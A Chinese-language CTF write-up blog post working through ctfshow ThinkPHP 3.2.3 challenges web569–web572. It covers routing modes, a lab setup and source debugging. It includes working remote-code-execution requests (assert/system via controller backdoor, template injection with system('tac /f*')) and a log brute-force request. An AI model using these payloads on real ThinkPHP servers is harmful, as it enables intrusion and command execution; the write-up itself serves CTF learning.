<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="刷"><title>ctfshow的thinkphp专题</title><link rel=canonical href=https://baozongwi.xyz/p/ctfshow-thinkphp-special/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="ctfshow的thinkphp专题"><meta property='og:description' content="刷"><meta property='og:url' content='https://baozongwi.xyz/p/ctfshow-thinkphp-special/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='thinkphp'><meta property='article:published_time' content='2024-10-16T11:09:27+00:00'><meta property='article:modified_time' content='2024-10-16T11:09:27+00:00'><meta name=twitter:title content="ctfshow的thinkphp专题"><meta name=twitter:description content="刷"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-map-pin"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
<span>travel</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#web569>web569</a></li><li><a href=#web570>web570</a></li><li><a href=#web571>web571</a></li><li><a href=#web572>web572</a></li><li><a href=#web573>web573</a></li><li><a href=#web574>web574</a></li><li><a href=#web575>web575</a></li><li><a href=#web576>web576</a></li><li><a href=#web577>web577</a></li><li><a href=#web-578>web 578</a></li><li><a href=#web-579>web 579</a></li><li><a href=#web604>web604</a></li><li><a href=#web605>web605</a></li><li><a href=#web606web610>web606&ndash;web610</a></li><li><a href=#未开启强制路由rce动态调试>未开启强制路由RCE动态调试</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/ctfshow/>Ctfshow</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/ctfshow-thinkphp-special/>ctfshow的thinkphp专题</a></h2><h3 class=article-subtitle>刷</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Oct 16, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><h1 id=安装composer>安装composer</h1><p>我们肯定是要看源码的，所以下载这个工具在Windows</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>https://getcomposer.org/Composer-Setup.exe
</span></span></code></pre></td></tr></table></div></div><p>下载之后，选中已经有的<code>php.exe</code></p><p>如果在ini中有这个设置就把他注释了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>xdebug.start_with_request=yes
</span></span></code></pre></td></tr></table></div></div><p>然后不要选择代理，就一直按next就可以了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>composer -v
</span></span><span class=line><span class=cl>如果有回显就是成功了
</span></span></code></pre></td></tr></table></div></div><h2 id=web569>web569</h2><p><a class=link href=https://github.com/372s/thinkphp-3.2.3 target=_blank rel=noopener>tp3.2.3下载</a></p><p>然后小皮里面设置路径为默认的目录，其中三个文件夹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>application
</span></span><span class=line><span class=cl>Public
</span></span><span class=line><span class=cl>ThinkPHP
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>CTFshow
</span></span><span class=line><span class=cl>thinkphp 专项训练-pathinfo的运用
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>flag在Admin模块的Login控制器的ctfshowLogin方法中
</span></span></code></pre></td></tr></table></div></div><p>这里就是tp的路由问题，如何利用路由直接来进行懒加载调用方法，因为类的命名空间和文件路径是一致的。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PATHINFO模式
</span></span><span class=line><span class=cl>/index.php/Admin/Login/ctfshowLogin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>普通模式
</span></span><span class=line><span class=cl>/index.php?m=Admin&amp;c=Login&amp;f=ctfshowLogin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>兼容模式
</span></span><span class=line><span class=cl>/index.php?s=Admin/Login/ctfshowLogin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>REWRITE模式
</span></span><span class=line><span class=cl>/Admin/Login/ctfshowLogin
</span></span></code></pre></td></tr></table></div></div><h2 id=web570>web570</h2><p>这里有个小技巧，打开全局搜索(VSCODE)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Ctrl+shift+f
</span></span></code></pre></td></tr></table></div></div><p>拿到代码之后挨个找找发现能看的其实也就这一个文件，里面会直接调用函数</p><p><img src=/p/ctfshow-thinkphp-special/QQ20241016-132816.png width=1436 height=930 srcset="/p/ctfshow-thinkphp-special/QQ20241016-132816_hu_1cc5faa0ea83ed09.png 480w, /p/ctfshow-thinkphp-special/QQ20241016-132816_hu_99b5d93ea835dec4.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=154 data-flex-basis=370px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$f</span><span class=o>=</span><span class=s2>&#34;assert&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$d</span><span class=o>=</span><span class=s2>&#34;system(&#39;whoami&#39;);&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span><span class=nv>$d</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>然后正常的打就可以了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /index.php/ctfshow/assert/system($_POST[a]) HTTP/1.1
</span></span><span class=line><span class=cl>Host: 8dc231d4-e447-441c-9d51-3e3f18902dd3.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=gk1cuucv5cqg8tls58b134unp4
</span></span><span class=line><span class=cl>Content-Length: 19
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>Origin: https://8dc231d4-e447-441c-9d51-3e3f18902dd3.challenge.ctf.show
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-User: ?1
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Referer: https://8dc231d4-e447-441c-9d51-3e3f18902dd3.challenge.ctf.show/
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Priority: u=0, i
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>a=tac /flag_is_here
</span></span></code></pre></td></tr></table></div></div><h2 id=web571>web571</h2><p><img src=/p/ctfshow-thinkphp-special/QQ20241016-162207.png width=1989 height=1036 srcset="/p/ctfshow-thinkphp-special/QQ20241016-162207_hu_bcce2e9debddd2fc.png 480w, /p/ctfshow-thinkphp-special/QQ20241016-162207_hu_e3bcdd6d3eb645d6.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=191 data-flex-basis=460px></p><p>这里有一个模版渲染漏洞，其中可以直接渲染<code>n</code></p><p>ThinkPHP 中的 URL 通常遵循如下结构：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php/Home/Controller/Action
</span></span></code></pre></td></tr></table></div></div><p>这个结构的意义如下：</p><ul><li><code>index.php</code>: 入口文件，负责加载框架。</li><li><code>Home</code>: 指向应用中的某个模块或命名空间。</li><li><code>Controller</code>: 指向具体的控制器类。</li><li><code>Action</code>: 指向控制器中的某个方法（动作）。</li></ul><p>控制器类名是 <code>IndexController</code>，根据 ThinkPHP 的约定，控制器名称应以 <code>Controller</code> 结尾。</p><p>在 URL 中，控制器的名称是去掉 <code>Controller</code> 后缀的，即在访问时应该使用 <code>Index</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php/Home/Index/index/?n=&lt;php&gt;system(&#34;tac /f*&#34;)&lt;/php&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/index.php/Home/Index/index/?n=&lt;?php system(&#34;tac /f*&#34;);?&gt;
</span></span></code></pre></td></tr></table></div></div><p>原因我们去看源码</p><p>现在用composer下载，在VSCODE终端中输入这条命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>composer create-project topthink/thinkphp=3.2.3 tp3
</span></span></code></pre></td></tr></table></div></div><p>替换恶意代码然后启动</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>namespace</span> <span class=nx>Home\Controller</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>use</span> <span class=nx>Think\Controller</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>IndexController</span> <span class=k>extends</span> <span class=nx>Controller</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>index</span><span class=p>(</span><span class=nv>$n</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>show</span><span class=p>(</span><span class=s1>&#39;&lt;style type=&#34;text/css&#34;&gt;*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: &#34;微软雅黑&#34;; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}&lt;/style&gt;&lt;div style=&#34;padding: 24px 48px;&#34;&gt; &lt;h1&gt;CTFshow&lt;/h1&gt;&lt;p&gt;thinkphp 专项训练&lt;/p&gt;&lt;p&gt;hello,&#39;</span><span class=o>.</span><span class=nv>$n</span><span class=o>.</span><span class=s1>&#39;黑客建立了控制器后门，你能找到吗&lt;/p&gt;&#39;</span><span class=p>,</span><span class=s1>&#39;utf-8&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>然后启动</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php -S localhost:8000
</span></span></code></pre></td></tr></table></div></div><p>发现刚才的<code>payload</code>是可以成功命令执行的，那么我们进行<code>debug</code>一探究竟</p><p><img src=/p/ctfshow-thinkphp-special/QQ20241016-174310.png width=1874 height=810 srcset="/p/ctfshow-thinkphp-special/QQ20241016-174310_hu_a069e169b16f69de.png 480w, /p/ctfshow-thinkphp-special/QQ20241016-174310_hu_a1545e40f1a0f2df.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=231 data-flex-basis=555px></p><p><img src=/p/ctfshow-thinkphp-special/QQ20241016-174550.png width=1491 height=551 srcset="/p/ctfshow-thinkphp-special/QQ20241016-174550_hu_533179bd0ee634f8.png 480w, /p/ctfshow-thinkphp-special/QQ20241016-174550_hu_d2e580cf857a858c.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=270 data-flex-basis=649px></p><p>这一步是调用方法然后就会进行<code>app::exec</code>的调用，再者进行存日志，删空间</p><p>调试走的是<code>app.class.php</code>的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>invokeAction()-&gt;exec()-&gt;run()-&gt;start()-&gt;fatalError()
</span></span></code></pre></td></tr></table></div></div><p>这里发现只是一些方法什么的确认，看来我们需要跟进</p><p>跟进之后发现是这条</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>show()-&gt;display()-&gt;fetch()-&gt;
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-thinkphp-special/QQ20241016-212328.png width=1559 height=919 srcset="/p/ctfshow-thinkphp-special/QQ20241016-212328_hu_bd1ec697c0cadb40.png 480w, /p/ctfshow-thinkphp-special/QQ20241016-212328_hu_87c3934c13a1e03b.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=169 data-flex-basis=407px></p><p>发现赋值是这样子，跟进这个函数之后发现代码被隐藏了，那么此时就只能查看官方文档了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>ob_get_clean</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$contents</span><span class=o>=</span><span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$contents</span><span class=o>!==</span><span class=k>false</span><span class=p>)</span> <span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$contents</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>ob_get_contents</code>用来返回缓冲区的内容</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;Hello &#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$out1</span><span class=o>=</span><span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;World&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$out2</span><span class=o>=</span><span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nv>$out1</span><span class=p>,</span><span class=nv>$out2</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>测试了就知道了输出的是缓存区的内容</p><p><img src=/p/ctfshow-thinkphp-special/QQ20241016-214041.png width=1496 height=794 srcset="/p/ctfshow-thinkphp-special/QQ20241016-214041_hu_56bfd25be327dd45.png 480w, /p/ctfshow-thinkphp-special/QQ20241016-214041_hu_b067352403b6820f.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=188 data-flex-basis=452px></p><p>这里我们模版是原生模版所以成功<code>eval</code>，审计好玩啊，就是代码好多看不懂</p><h2 id=web572>web572</h2><p>爆破一下了只有</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /Application/Runtime/Logs/Home/§21_09_06§.log HTTP/1.1
</span></span><span class=line><span class=cl>Host: 5f96fa2c-732c-4b3b-8bfd-ccd8cc49b70e.challenge.ctf.show
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=q0fdga7ep6qaip22ssm216r1m5
</span></span><span class=line><span class=cl>Pragma: no-cache
</span></span><span class=line><span class=cl>Cache-Control: no-cache
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Sec-Ch-Ua: &#34;Google Chrome&#34;;v=&#34;129&#34;, &#34;Not=A?Brand&#34;;v=&#34;8&#34;, &#34;Chromium&#34;;v=&#34;129&#34;
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Mobile: ?0
</span></span><span class=line><span class=cl>Sec-Ch-Ua-Platform: &#34;Windows&#34;
</span></span><span class=line><span class=cl>Sec-Fetch-Site: same-origin
</span></span><span class=line><span class=cl>Sec-Fetch-Mode: navigate
</span></span><span class=line><span class=cl>Sec-Fetch-Dest: document
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Referer: https://5f96fa2c-732c-4b3b-8bfd-ccd8cc49b70e.challenge.ctf.show/
</span></span><span class=line><span class=cl>Priority: u=0, i
</span></span><span class=line><span class=cl>Connection: close
